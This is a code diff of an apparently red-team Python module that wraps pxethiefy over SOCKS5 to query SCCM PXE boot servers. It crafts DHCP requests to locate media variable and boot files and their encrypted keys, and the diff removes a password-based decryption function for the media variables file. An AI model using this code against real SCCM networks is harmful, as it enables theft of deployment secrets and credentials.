@@ -8,6 +8,7 @@ from lib.socks import SOCKS5Client
 from Crypto.Cipher import AES,DES3
 
 ## A lot of code here is taken from pxethiefy.py (we're just wrapping in SOCKS5), with thanks to the author!
+## https://github.com/csandker/pxethiefy/blob/main/pxethiefy.py
 
 class SCCM:
     def __init__(self, target, port, socks_client):
@@ -16,7 +17,6 @@ class SCCM:
         self.socks_client = socks_client
         
     def _craft_packet(self, client_ip, client_mac):
-        # Taken from pxethiefy.py
         pkt = BOOTP(ciaddr=client_ip,chaddr=client_mac)/DHCP(options=[
             ("message-type","request"),
             ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
@@ -29,7 +29,6 @@ class SCCM:
         
         return pkt
     
-    # Taken from pxethiefy.py with thanks!
     def _extract_boot_files(self, variables_file, dhcp_options):
         bcd_file, encrypted_key = (None, None)
         if variables_file:
@@ -58,40 +57,12 @@ class SCCM:
                 variables_file = variables_file.decode('utf-8')
             bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
         else:
-            print("No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location", MSG_TYPE_ERROR)
+            print("[!] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location", MSG_TYPE_ERROR)
         
         return [variables_file,bcd_file,encrypted_key]
 
     def read_media_variable_file(self, filedata):   
         return filedata[24:-8]
-
-    def decrypt_media_file(self, data, password):
-        password_is_string = True
-        #print("[+] Media variables file to decrypt: " + path)
-        if type(password) == str:
-            password_is_string = True
-            print("[+] Password provided: " + password)
-        else:
-            password_is_string = False
-            print("[+] Password bytes provided: 0x" + password.hex())
-
-        # Decrypt encryted media variables file
-        encrypted_file = self.read_media_variable_file(data) 
-        try:
-            if password_is_string:
-                key = self.aes_des_key_derivation(password.encode("utf-16-le"))
-            else:
-                key = self.aes_des_key_derivation(password)
-            last_16 = math.floor(len(encrypted_file)/16)*16
-            decrypted_media_file = self.aes128_decrypt(encrypted_file[:last_16],key[:16])
-            decrypted_media_file =  decrypted_media_file[:decrypted_media_file.rfind('\x00')]
-            wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
-            print("Successfully decrypted media variables file with the provided password!")
-        except:
-            print("Failed to decrypt media variables file. Check the password provided is correct")
-            return None
-    
-        return wf_decrypted_ts
 
     def aes128_decrypt(self,data,key):
         aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
